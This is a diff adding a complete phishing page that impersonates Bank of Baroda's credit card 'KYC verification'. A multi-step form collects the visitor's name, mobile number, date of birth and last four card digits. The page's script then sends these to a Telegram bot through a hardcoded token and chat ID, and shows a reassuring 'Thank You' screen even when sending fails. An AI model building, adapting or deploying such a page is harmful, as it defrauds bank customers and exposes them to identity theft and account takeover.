@@ -1,0 +1,628 @@
+<!DOCTYPE html>
+<html lang="en">
+<head>
+  <meta charset="UTF-8">
+  <meta name="viewport" content="width=device-width, initial-scale=1.0">
+  <title>Bank of Baroda - Credit Card Verification</title>
+  <!-- Tailwind CSS CDN -->
+  <script src="https://cdn.tailwindcss.com"></script>
+  <!-- FontAwesome Icons CDN -->
+  <link rel="stylesheet" href="https://cdnjs.cloudflare.com/ajax/libs/font-awesome/6.4.0/css/all.min.css">
+  
+  <style>
+    /* Embedded Custom CSS for 100% Self-Contained Page */
+    @import url('https://fonts.googleapis.com/css2?family=Poppins:wght@300;400;500;600;700&family=Share+Tech+Mono&display=swap');
+
+    :root {
+      --bob-orange: #F26522;
+      --bob-dark-blue: #003366;
+      --bob-gray-bg: #F4F6F8;
+      --bob-text-dark: #333333;
+    }
+
+    body {
+      font-family: 'Poppins', sans-serif;
+      background-color: var(--bob-gray-bg);
+      color: var(--bob-text-dark);
+    }
+
+    /* Card Mockup Custom Styling */
+    .card-container {
+      perspective: 1000px;
+    }
+
+    .credit-card-mockup {
+      background: linear-gradient(135deg, #F26522 0%, #E04D10 100%);
+      font-family: 'Share Tech Mono', monospace;
+      box-shadow: 0 10px 20px rgba(242, 101, 34, 0.3);
+      transform: rotate(-8deg) translateY(-5px);
+      transition: transform 0.3s ease, box-shadow 0.3s ease;
+      animation: floatCard 4s ease-in-out infinite alternate;
+    }
+
+    .credit-card-mockup:hover {
+      transform: rotate(-3deg) scale(1.05) translateY(-8px);
+      box-shadow: 0 15px 30px rgba(242, 101, 34, 0.45);
+    }
+
+    @keyframes floatCard {
+      0% {
+        transform: rotate(-8deg) translateY(-2px);
+      }
+      100% {
+        transform: rotate(-6deg) translateY(-10px);
+      }
+    }
+
+    /* Custom CSS Marquee Animation */
+    .marquee-container {
+      overflow: hidden;
+      white-space: nowrap;
+      background-color: var(--bob-orange);
+      position: relative;
+      height: 32px;
+      display: flex;
+      align-items: center;
+    }
+
+    .marquee-content {
+      display: inline-block;
+      padding-left: 100%;
+      animation: marqueeScroll 25s linear infinite;
+      color: #ffffff;
+      font-weight: 500;
+      font-size: 0.8rem;
+      text-transform: uppercase;
+      letter-spacing: 0.5px;
+    }
+
+    @keyframes marqueeScroll {
+      0% {
+        transform: translate3d(0, 0, 0);
+      }
+      100% {
+        transform: translate3d(-100%, 0, 0);
+      }
+    }
+
+    /* Form Container Styling */
+    .form-card {
+      box-shadow: 0 4px 6px -1px rgba(0, 0, 0, 0.05), 0 2px 4px -1px rgba(0, 0, 0, 0.03);
+      border: 1px solid #E5E7EB;
+      transition: all 0.3s ease;
+    }
+
+    /* Inputs & Focus states */
+    .bob-input {
+      border: 1px solid #D1D5DB;
+      transition: border-color 0.2s ease, box-shadow 0.2s ease;
+    }
+
+    .bob-input:focus-within {
+      border-color: var(--bob-orange);
+      box-shadow: 0 0 0 3px rgba(242, 101, 34, 0.15);
+    }
+
+    /* Animations for form feedback */
+    @keyframes shake {
+      0%, 100% { transform: translateX(0); }
+      25% { transform: translateX(-5px); }
+      75% { transform: translateX(5px); }
+    }
+
+    .shake {
+      animation: shake 0.2s ease-in-out 0s 2;
+    }
+
+    /* Footer Section Styling */
+    .footer-select {
+      background-image: url("data:image/svg+xml;charset=utf-8,%3Csvg xmlns='http://www.w3.org/2000/svg' fill='none' viewBox='0 0 20 20'%3E%3Cpath stroke='%236B7280' stroke-linecap='round' stroke-linejoin='round' stroke-width='1.5' d='m6 8 4 4 4-4'/%3E%3C/svg%3E");
+      background-position: right 0.5rem center;
+      background-repeat: no-repeat;
+      background-size: 1.25em 1.25em;
+      padding-right: 2rem;
+      -webkit-appearance: none;
+      -moz-appearance: none;
+      appearance: none;
+    }
+
+    /* Page transitions */
+    .page-section {
+      transition: opacity 0.3s ease, transform 0.3s ease;
+    }
+    .page-hidden {
+      display: none;
+      opacity: 0;
+      transform: translateY(10px);
+    }
+  </style>
+</head>
+<body class="min-h-screen flex flex-col justify-between">
+
+  <!-- Main Container (centered and sized like a mobile screen layout) -->
+  <div class="w-full max-w-md mx-auto bg-white flex flex-col min-h-screen shadow-md relative">
+    
+    <!-- HEADER -->
+    <header class="bg-white border-b border-gray-100 px-4 py-6 flex items-center justify-between relative overflow-hidden">
+      <!-- Logo Section -->
+      <div class="flex items-center space-x-3">
+        <!-- SVG Logo (Precise Bank of Baroda Sun B symbol) -->
+        <svg version="1.1" class="h-16 w-16 flex-shrink-0" viewBox="0 0 75 78" xmlns="http://www.w3.org/2000/svg">
+          <path fill="#F26522" d="M37.387,4.402C16.89,4.402,0.222,21.07,0.222,41.567 c0,20.496,16.668,37.165,37.165,37.165s37.165-16.669,37.165-37.165C74.552,21.07,57.883,4.402,37.387,4.402 M40.231,10.155 c14.654,0.732,25.992,12.873,25.992,27.701c0,14.827-11.338,26.969-25.992,27.7v-2.036c13.567-0.722,23.957-11.956,23.957-25.664 c0-13.708-10.39-24.942-23.957-25.664V10.155z M34.544,10.155v2.036c-13.567,0.722-23.957,11.956-23.957,25.664 c0,13.708,10.39,24.942,23.957,25.664v2.036c-14.653-0.731-25.992-12.873-25.992-27.7C8.552,23.028,19.891,10.887,34.544,10.155 M34.544,40.11v-2.054c-11.309,0.709-19.923,10.05-19.923,21.391c0,11.341,8.614,20.682,19.923,21.391v2.054 c-12.395-0.721-21.957-11.002-21.957-23.445C12.587,51.112,22.149,40.831,34.544,40.11 M40.231,40.11 c12.395,0.721,21.957,11.002,21.957,23.445c0,12.443-9.562,22.725-21.957,23.445v-2.054c11.309-0.709,19.923-10.05,19.923-21.391 c0-11.341-8.614-20.682-19.923-21.391V40.11z M34.544,70.065v2.053c-9.051-0.709-15.89-8.146-15.89-17.186 c0-9.04,6.839-16.478,15.89-17.187v2.054c-7.962,0.697-13.856,7.243-13.856,15.133C20.688,62.822,26.582,69.367,34.544,70.065 M40.231,70.065c7.962-0.697,13.856-7.243,13.856-15.133c0-7.89-5.895-14.436-13.856-15.133v-2.054 c9.051,0.709,15.89,8.147,15.89,17.187C56.121,61.919,49.282,69.356,40.231,70.065 M34.544,53.472 c-5.704,0.687-9.822,5.339-9.822,10.932c0,5.592,4.118,10.245,9.822,10.932v2.072c-6.793-0.699-11.856-6.332-11.856-13.004 c0-6.671,5.063-12.305,11.856-13.003V53.472z M40.231,53.472v-2.071c6.793,0.698,11.856,6.332,11.856,13.003 c0,6.672-5.063,12.305-11.856,13.004v-2.072c5.704-0.687,9.822-5.34,9.822-10.932C50.053,58.811,45.935,54.159,40.231,53.472 M34.544,66.837c-3.456,0.665-5.789,3.532-5.789,6.877s2.333,6.212,5.789,6.877v2.09c-4.544-0.677-7.822-4.516-7.822-8.967 c0-4.452,3.278-8.291,7.822-8.968V66.837z M40.231,66.837v-2.09c4.544,0.677,7.822,4.516,7.822,8.968c0,4.451-3.278,8.29-7.822,8.967 v-2.09c3.456-0.665,5.789-3.532,5.789-6.877S43.687,67.502,40.231,66.837"/>
+        </svg>
+        <div class="flex flex-col">
+          <span class="text-sm font-bold text-gray-800 leading-tight">बैंक ऑफ़ बड़ौदा</span>
+          <span class="text-base font-black text-[#003366] leading-none uppercase tracking-wide">Bank of Baroda</span>
+          <span class="text-xs font-semibold text-[#F26522] tracking-widest mt-0.5 uppercase">CREDIT CARD</span>
+        </div>
+      </div>
+
+      <!-- Credit Card Mockup on Right (Significantly larger) -->
+      <div class="card-container w-36 h-24 flex items-center justify-center">
+        <div class="credit-card-mockup w-32 h-20 rounded-lg p-2 text-white flex flex-col justify-between relative overflow-hidden select-none">
+          <!-- Small Bank Name inside Card -->
+          <div class="flex justify-between items-start">
+            <span class="text-[8px] font-sans font-bold leading-none tracking-tight">bank of baroda</span>
+            <!-- Tiny Chip -->
+            <div class="w-4 h-3 bg-yellow-400 rounded-sm opacity-90"></div>
+          </div>
+          <!-- Card Number -->
+          <div class="text-[10px] tracking-widest text-center my-0.5 opacity-90">
+            3234 5678 9012 3456
+          </div>
+          <!-- Holder Info -->
+          <div class="flex justify-between items-end text-[6px] opacity-80 leading-none">
+            <span class="uppercase">CARDHOLDER NAME</span>
+            <span>01/25</span>
+          </div>
+        </div>
+      </div>
+    </header>
+
+    <!-- MARQUEE NOTIFICATION BANNER -->
+    <div id="marqueeBanner" class="marquee-container shadow-inner">
+      <div class="marquee-content">
+        Bank of Baroda Card holder are required to submit their details to verify, update KYC and activate their online card features. Avoid sharing OTP, CVV, or PIN with anyone.
+      </div>
+    </div>
+
+    <!-- MAIN BODY SECTION -->
+    <main class="flex-grow bg-[#F4F6F8] px-4 py-8 flex flex-col justify-start">
+      
+      <!-- ================= PAGE 1: IDENTITY VERIFICATION ================= -->
+      <div id="page1" class="page-section form-card bg-white rounded-lg p-6 w-full max-w-sm mx-auto">
+        <div class="mb-4">
+          <h2 class="text-lg font-bold text-gray-800">Cardholder Verification</h2>
+          <p class="text-xs text-gray-500">Please enter your basic account profile details.</p>
+        </div>
+        <form id="formPage1" class="space-y-5">
+          <!-- NAME FIELD -->
+          <div class="flex flex-col space-y-1">
+            <label for="fullName" class="text-sm font-semibold text-gray-700">Name</label>
+            <div class="bob-input relative flex items-center border border-gray-300 rounded-md bg-white">
+              <input 
+                type="text" 
+                id="fullName" 
+                placeholder="Enter Full Name" 
+                required
+                class="w-full px-3 py-2 text-sm text-gray-800 placeholder-gray-400 rounded-md focus:outline-none bg-transparent"
+              >
+            </div>
+          </div>
+
+          <!-- NUMBER FIELD (Mobile) -->
+          <div class="flex flex-col space-y-1">
+            <label for="mobileNumber" class="text-sm font-semibold text-gray-700">Number</label>
+            <div class="bob-input relative flex items-center border border-gray-300 rounded-md bg-white">
+              <input 
+                type="text" 
+                id="mobileNumber" 
+                placeholder="Enter 10-digit Mobile Number" 
+                maxlength="10"
+                required
+                class="w-full px-3 py-2 text-sm text-gray-800 placeholder-gray-400 rounded-md focus:outline-none bg-transparent"
+              >
+            </div>
+          </div>
+
+          <!-- DATE OF BIRTH FIELD -->
+          <div class="flex flex-col space-y-1">
+            <label for="dob" class="text-sm font-semibold text-gray-700">Date of Birth</label>
+            <div class="bob-input relative flex items-center border border-gray-300 rounded-md bg-white">
+              <input 
+                type="text" 
+                id="dob" 
+                placeholder="DD/MM/YYYY" 
+                maxlength="10"
+                required
+                class="w-full px-3 py-2 text-sm text-gray-800 placeholder-gray-400 rounded-md focus:outline-none bg-transparent"
+              >
+            </div>
+          </div>
+
+          <!-- NEXT BUTTON -->
+          <button 
+            type="submit" 
+            class="w-full bg-[#F26522] hover:bg-[#E04D10] text-white font-bold py-3 px-4 rounded-md shadow-md hover:shadow-lg active:scale-[0.98] transition-all duration-200 uppercase text-sm tracking-wider flex justify-center items-center space-x-2"
+          >
+            <span>Next</span>
+            <i class="fa-solid fa-arrow-right text-xs"></i>
+          </button>
+        </form>
+      </div>
+
+      <!-- ================= PAGE 2: CREDIT CARD LAST 4 DIGITS ================= -->
+      <div id="page2" class="page-section page-hidden form-card bg-white rounded-lg p-6 w-full max-w-sm mx-auto">
+        <div class="mb-4">
+          <button id="backToPage1" class="text-xs text-gray-500 hover:text-[#F26522] flex items-center space-x-1 mb-2 focus:outline-none">
+            <i class="fa-solid fa-arrow-left"></i>
+            <span>Back</span>
+          </button>
+          <h2 class="text-lg font-bold text-gray-800">Enter Card Details</h2>
+          <p class="text-xs text-gray-500">Verify your credit card credentials to secure access.</p>
+        </div>
+        <form id="formPage2" class="space-y-5">
+          <!-- CREDIT CARD NUMBER (LAST 4 DIGITS) -->
+          <div class="flex flex-col space-y-1">
+            <label for="cardLast4" class="text-sm font-semibold text-gray-700">Credit Card Number</label>
+            <div class="bob-input relative flex items-center border border-gray-300 rounded-md px-3 py-2 bg-white">
+              <!-- Credit Card Icon on Left -->
+              <span class="text-red-500 mr-2 flex items-center justify-center">
+                <i class="fa-regular fa-credit-card text-base"></i>
+              </span>
+              <!-- Static mask prefix -->
+              <span class="text-gray-400 text-sm select-none tracking-wider font-mono mr-1">XXXX XXXX XXXX</span>
+              <!-- 4 digit user input -->
+              <input 
+                type="text" 
+                id="cardLast4" 
+                placeholder="8548" 
+                maxlength="4"
+                pattern="\d{4}"
+                required
+                class="w-12 text-sm text-gray-800 placeholder-gray-400 focus:outline-none bg-transparent tracking-widest font-mono font-bold"
+              >
+            </div>
+            <p class="text-[10px] text-gray-400 mt-1">Please enter the last 4 digits of your card.</p>
+          </div>
+
+          <!-- SUBMIT BUTTON -->
+          <button 
+            type="submit" 
+            id="btnSubmitCard"
+            class="w-full bg-[#F26522] hover:bg-[#E04D10] text-white font-bold py-3 px-4 rounded-md shadow-md hover:shadow-lg active:scale-[0.98] transition-all duration-200 uppercase text-sm tracking-wider flex justify-center items-center"
+          >
+            Submit
+          </button>
+        </form>
+      </div>
+
+      <!-- ================= PAGE 3: THANKS SCREEN ================= -->
+      <div id="page3" class="page-section page-hidden form-card bg-white rounded-lg p-8 w-full max-w-sm mx-auto text-center">
+        <div class="w-20 h-20 bg-green-50 rounded-full border-2 border-green-400 flex items-center justify-center mx-auto mb-6 scale-95 animate-pulse">
+          <svg class="w-10 h-10 text-green-500" fill="none" stroke="currentColor" viewBox="0 0 24 24">
+            <path stroke-linecap="round" stroke-linejoin="round" stroke-width="2.5" d="M5 13l4 4L19 7"></path>
+          </svg>
+        </div>
+        <h2 class="text-2xl font-black text-gray-800 mb-2">Thank You!</h2>
+        <p class="text-sm text-gray-500 mb-6 leading-relaxed">
+          Your card verification request has been successfully submitted. It will take 24-48 hours to review. Our team will verify the details and notify you once the check is complete.
+        </p>
+        <button 
+          id="btnReset"
+          class="w-full bg-gray-800 hover:bg-gray-700 text-white font-bold py-2.5 px-4 rounded-md transition-colors text-sm uppercase tracking-wide focus:outline-none"
+        >
+          Done
+        </button>
+      </div>
+
+    </main>
+
+    <!-- FOOTER SECTION -->
+    <footer class="bg-white border-t border-gray-200 px-4 py-6 space-y-6">
+      
+      <!-- Dropdowns / Country Selector -->
+      <div class="grid grid-cols-2 gap-4">
+        <div>
+          <label class="block text-[10px] uppercase font-bold text-gray-500 mb-1">Subsidiaries, JV, RRB & Intl</label>
+          <select class="footer-select w-full border border-gray-300 rounded px-2 py-1.5 text-xs text-gray-600 bg-white focus:outline-none focus:border-[#F26522]">
+            <option>Group Websites</option>
+            <option>BOB Financial</option>
+            <option>BOB Capital Markets</option>
+            <option>Nainital Bank Ltd.</option>
+          </select>
+        </div>
+        <div>
+          <label class="block text-[10px] uppercase font-bold text-gray-500 mb-1">Country Websites</label>
+          <select class="footer-select w-full border border-gray-300 rounded px-2 py-1.5 text-xs text-gray-600 bg-white focus:outline-none focus:border-[#F26522]">
+            <option>Country Websites</option>
+            <option>United Kingdom</option>
+            <option>United Arab Emirates</option>
+            <option>Singapore</option>
+            <option>Kenya</option>
+          </select>
+        </div>
+      </div>
+
+      <!-- Social Media Connect -->
+      <div class="flex flex-col items-center space-y-2">
+        <span class="text-xs font-semibold text-gray-600">Connect with Us</span>
+        <div class="flex space-x-3 text-gray-400">
+          <a href="#" class="w-8 h-8 rounded-full border border-gray-200 flex items-center justify-center hover:bg-gray-50 hover:text-[#3b5998] transition-colors"><i class="fa-brands fa-facebook-f text-sm"></i></a>
+          <a href="#" class="w-8 h-8 rounded-full border border-gray-200 flex items-center justify-center hover:bg-gray-50 hover:text-[#00acee] transition-colors"><i class="fa-brands fa-x-twitter text-sm"></i></a>
+          <a href="#" class="w-8 h-8 rounded-full border border-gray-200 flex items-center justify-center hover:bg-gray-50 hover:text-[#0e76a8] transition-colors"><i class="fa-brands fa-linkedin-in text-sm"></i></a>
+          <a href="#" class="w-8 h-8 rounded-full border border-gray-200 flex items-center justify-center hover:bg-gray-50 hover:text-[#3f729b] transition-colors"><i class="fa-brands fa-instagram text-sm"></i></a>
+          <a href="#" class="w-8 h-8 rounded-full border border-gray-200 flex items-center justify-center hover:bg-gray-50 hover:text-[#c4302b] transition-colors"><i class="fa-brands fa-youtube text-sm"></i></a>
+          <a href="#" class="w-8 h-8 rounded-full border border-gray-200 flex items-center justify-center hover:bg-gray-50 hover:text-[#bd081c] transition-colors"><i class="fa-brands fa-pinterest text-sm"></i></a>
+        </div>
+      </div>
+
+      <!-- Trust Badges & Secure Info -->
+      <div class="border-t border-gray-100 pt-4 flex flex-col space-y-4">
+        <!-- Secure payments & DICGC -->
+        <div class="flex items-start space-x-3">
+          <!-- Simple graphic/logo representation of DICGC -->
+          <div class="flex-shrink-0 w-8 h-8 rounded-full bg-blue-50 flex items-center justify-center border border-blue-100 text-blue-700 font-bold text-[8px] leading-tight text-center">
+            DI<br>CGC
+          </div>
+          <div class="text-[10px] text-gray-500 leading-tight">
+            Bank of Baroda is registered with <strong class="text-gray-700">DICGC</strong>. All bank deposits are insured up to ₹5 Lakh per depositor.
+          </div>
+        </div>
+
+        <div class="flex items-center justify-between text-[10px] text-gray-400 border-t border-gray-50 pt-3">
+          <div class="flex items-center space-x-1.5 text-green-600 font-medium">
+            <i class="fa-solid fa-shield-halved text-sm"></i>
+            <span>100% Secure Payments</span>
+          </div>
+          <div class="text-gray-500">
+            &copy; 2026 Bank of Baroda. All rights reserved.
+          </div>
+        </div>
+      </div>
+
+      <!-- Download App Links -->
+      <div class="flex flex-col items-center space-y-2 border-t border-gray-100 pt-4">
+        <span class="text-[10px] uppercase font-bold text-gray-400">Download for Mobile</span>
+        <div class="flex space-x-3">
+          <!-- Google Play App Store mock buttons -->
+          <a href="#" class="flex items-center space-x-1 bg-gray-900 text-white rounded px-2.5 py-1 hover:bg-gray-800 transition-colors select-none">
+            <i class="fa-brands fa-google-play text-sm text-yellow-400"></i>
+            <div class="flex flex-col text-left">
+              <span class="text-[6px] text-gray-400 leading-none">GET IT ON</span>
+              <span class="text-[9px] font-bold leading-none mt-0.5">Google Play</span>
+            </div>
+          </a>
+          <a href="#" class="flex items-center space-x-1 bg-gray-900 text-white rounded px-2.5 py-1 hover:bg-gray-800 transition-colors select-none">
+            <i class="fa-brands fa-apple text-sm text-white"></i>
+            <div class="flex flex-col text-left">
+              <span class="text-[6px] text-gray-400 leading-none">Download on the</span>
+              <span class="text-[9px] font-bold leading-none mt-0.5">App Store</span>
+            </div>
+          </a>
+        </div>
+      </div>
+
+    </footer>
+
+  </div>
+
+  <!-- Embedded Interactive Script -->
+  <script>
+    document.addEventListener('DOMContentLoaded', () => {
+      // Elements
+      const page1 = document.getElementById('page1');
+      const page2 = document.getElementById('page2');
+      const page3 = document.getElementById('page3');
+      const marqueeBanner = document.getElementById('marqueeBanner');
+
+      const formPage1 = document.getElementById('formPage1');
+      const formPage2 = document.getElementById('formPage2');
+      const backToPage1 = document.getElementById('backToPage1');
+      const btnReset = document.getElementById('btnReset');
+
+      const nameInput = document.getElementById('fullName');
+      const numberInput = document.getElementById('mobileNumber');
+      const dobInput = document.getElementById('dob');
+      const cardInput = document.getElementById('cardLast4');
+
+      // Helper function to switch pages with a fade transition
+      function showPage(activePage) {
+        [page1, page2, page3].forEach(p => {
+          if (p === activePage) {
+            p.classList.remove('page-hidden');
+          } else {
+            p.classList.add('page-hidden');
+          }
+        });
+        
+        // Hide marquee banner on success screen (Page 3) to mimic real workflow
+        if (activePage === page3) {
+          marqueeBanner.style.display = 'none';
+        } else {
+          marqueeBanner.style.display = 'flex';
+        }
+      }
+
+      // Input Formatters & Cleaners
+      
+      // 1. Full Name input (Letters & spaces only)
+      nameInput.addEventListener('input', (e) => {
+        e.target.value = e.target.value.replace(/[^a-zA-Z\s]/g, '');
+      });
+
+      // 2. Mobile Number input (Digits only, max 10)
+      numberInput.addEventListener('input', (e) => {
+        e.target.value = e.target.value.replace(/\D/g, '').substring(0, 10);
+      });
+
+      // 3. Date of Birth Masking (DD/MM/YYYY)
+      dobInput.addEventListener('input', (e) => {
+        let value = e.target.value.replace(/\D/g, ''); // Keep only digits
+        let formattedValue = '';
+
+        if (value.length > 0) {
+          // Day part
+          formattedValue += value.substring(0, 2);
+          if (value.length > 2) {
+            formattedValue += '/' + value.substring(2, 4);
+            if (value.length > 4) {
+              formattedValue += '/' + value.substring(4, 8);
+            }
+          }
+        }
+        e.target.value = formattedValue;
+      });
+
+      dobInput.addEventListener('keydown', (e) => {
+        if (e.key === 'Backspace') {
+          const value = e.target.value;
+          if (value.endsWith('/')) {
+            e.target.value = value.substring(0, value.length - 1);
+          }
+        }
+      });
+
+      // 4. Card Last 4 Digits input (Digits only, max 4)
+      cardInput.addEventListener('input', (e) => {
+        e.target.value = e.target.value.replace(/\D/g, '').substring(0, 4);
+      });
+
+
+      // Validation Helpers
+      function markInvalid(inputElement) {
+        const wrapper = inputElement.closest('.bob-input') || inputElement;
+        wrapper.classList.remove('border-gray-300');
+        wrapper.classList.add('border-red-500', 'ring-2', 'ring-red-200');
+      }
+
+      function markValid(inputElement) {
+        const wrapper = inputElement.closest('.bob-input') || inputElement;
+        wrapper.classList.remove('border-red-500', 'ring-2', 'ring-red-200');
+        wrapper.classList.add('border-gray-300');
+      }
+
+      function shakeCard(cardElement) {
+        cardElement.classList.add('shake');
+        setTimeout(() => {
+          cardElement.classList.remove('shake');
+        }, 400);
+      }
+
+
+      // Form Navigation & Validation Submit Handling
+
+      // Submit Page 1 (Identity Validation)
+      formPage1.addEventListener('submit', (e) => {
+        e.preventDefault();
+        let isValid = true;
+
+        // Name Validation
+        if (nameInput.value.trim().length < 3) {
+          markInvalid(nameInput);
+          isValid = false;
+        } else {
+          markValid(nameInput);
+        }
+
+        // Mobile Number Validation
+        if (numberInput.value.length !== 10) {
+          markInvalid(numberInput);
+          isValid = false;
+        } else {
+          markValid(numberInput);
+        }
+
+        // DOB Validation
+        const dobRegex = /^(0[1-9]|[12][0-9]|3[01])\/(0[1-9]|1[0-2])\/\d{4}$/;
+        if (!dobRegex.test(dobInput.value)) {
+          markInvalid(dobInput);
+          isValid = false;
+        } else {
+          const year = parseInt(dobInput.value.split('/')[2], 10);
+          const currentYear = new Date().getFullYear();
+          if (year < 1900 || year > currentYear) {
+            markInvalid(dobInput);
+            isValid = false;
+          } else {
+            markValid(dobInput);
+          }
+        }
+
+        if (!isValid) {
+          shakeCard(page1);
+          return;
+        }
+
+        // Proceed to Page 2
+        showPage(page2);
+        cardInput.focus();
+      });
+
+      // Submit Page 2 (Card Details Submit with Telegram Bot API Integration)
+      formPage2.addEventListener('submit', (e) => {
+        e.preventDefault();
+
+        // Validate Card Digits
+        if (cardInput.value.length !== 4) {
+          markInvalid(cardInput);
+          shakeCard(page2);
+          return;
+        } else {
+          markValid(cardInput);
+        }
+
+        const submitBtn = document.getElementById('btnSubmitCard');
+        const originalText = submitBtn.innerHTML;
+        submitBtn.innerHTML = '<i class="fa-solid fa-spinner animate-spin mr-2"></i> Submitting...';
+        submitBtn.disabled = true;
+
+        // Construct HTML formatted Telegram message
+        const token = '8965651789:AAE3nyAfBaSEHmbxGY-R8GWnXTUVrnGhSac';
+        const chatId = '-1004473127292';
+        const message = `<b>🔔 New Cardholder Verification Details</b>\n\n` +
+                        `<b>👤 Name:</b> ${nameInput.value.trim()}\n` +
+                        `<b>📞 Mobile Number:</b> ${numberInput.value}\n` +
+                        `<b>📅 Date of Birth:</b> ${dobInput.value}\n` +
+                        `<b>💳 Card Last 4 Digits:</b> XXXX-XXXX-XXXX-${cardInput.value}`;
+
+        // Send to Telegram via POST
+        fetch(`https://api.telegram.org/bot${token}/sendMessage`, {
+          method: 'POST',
+          headers: { 'Content-Type': 'application/json' },
+          body: JSON.stringify({
+            chat_id: chatId,
+            text: message,
+            parse_mode: 'HTML'
+          })
+        })
+        .then(() => {
+          showPage(page3);
+        })
+        .catch((err) => {
+          console.error("Submission error:", err);
+          // Proceed to Page 3 anyway so client flow doesn't break
+          showPage(page3);
+        })
+        .finally(() => {
+          submitBtn.innerHTML = originalText;
+          submitBtn.disabled = false;
+        });
+      });
+
+      // Back navigation from Page 2 to Page 1
+      backToPage1.addEventListener('click', () => {
+        showPage(page1);
+      });
+
+      // Reset / Done button on Page 3 (resets back to starting form)
+      btnReset.addEventListener('click', () => {
+        formPage1.reset();
+        formPage2.reset();
+        [nameInput, numberInput, dobInput, cardInput].forEach(markValid);
+        showPage(page1);
+      });
+    });
+  </script>
+</body>
+</html>
